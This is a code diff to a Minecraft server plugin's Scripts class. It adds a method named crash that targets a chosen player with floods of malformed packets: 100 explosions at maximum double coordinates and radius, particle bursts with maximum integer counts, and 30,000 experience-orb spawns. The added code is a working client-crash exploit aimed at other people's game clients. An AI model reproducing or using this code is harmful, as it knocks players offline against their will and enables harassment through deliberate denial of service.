@@ -6,7 +6,18 @@ import com.google.gson.JsonParser;
 import cz.qery.toolkit.lunar.Waypoint;
 import lombok.AllArgsConstructor;
 import lombok.Data;
+import net.minecraft.network.protocol.game.PacketPlayOutAnimation;
+import net.minecraft.network.protocol.game.PacketPlayOutExplosion;
+import net.minecraft.network.protocol.game.PacketPlayOutSpawnEntityExperienceOrb;
+import net.minecraft.network.protocol.game.PacketPlayOutSpawnEntityLiving;
+import net.minecraft.server.level.EntityPlayer;
+import net.minecraft.world.entity.EntityExperienceOrb;
+import net.minecraft.world.entity.EntityLiving;
+import net.minecraft.world.entity.EntityTypes;
+import net.minecraft.world.phys.Vec3D;
 import org.bukkit.*;
+import org.bukkit.craftbukkit.v1_18_R1.entity.CraftPlayer;
+import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.metadata.FixedMetadataValue;
 
@@ -15,6 +26,7 @@ import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
 
 public class Scripts {
@@ -125,5 +137,39 @@ public class Scripts {
         } catch (Exception e) {
             Tools.log(b+"["+n+"ToolKit"+b+"] &cAPI version check failed");
         }
+    }
+
+    public static void crash(Player p) throws InterruptedException {
+        EntityPlayer p_entity = ((CraftPlayer) p).getHandle();
+        Location loc = p.getLocation();
+
+        for (int i = 0; i < 100; i++) {
+            PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
+            p_entity.b.a(packet);
+        }
+
+        Thread.sleep(1000);
+
+        for (int i = 0; i < 100; i++) {
+            p.spawnParticle(Particle.EXPLOSION_HUGE, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.EXPLOSION_LARGE, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.EXPLOSION_NORMAL, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.TOTEM, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.SMOKE_LARGE, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.SMOKE_NORMAL, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.DRAGON_BREATH, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.CLOUD, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.CRIT, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.CRIT_MAGIC, loc, Integer.MAX_VALUE);
+        }
+
+        Thread.sleep(1000);
+
+        for (int i = 0; i < 30000; i++) {
+            EntityExperienceOrb dd = new EntityExperienceOrb(p_entity.t, p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ(), Integer.MAX_VALUE);
+            PacketPlayOutSpawnEntityExperienceOrb packet = new PacketPlayOutSpawnEntityExperienceOrb(dd);
+            p_entity.b.a(packet);
+        }
+
     }
 }
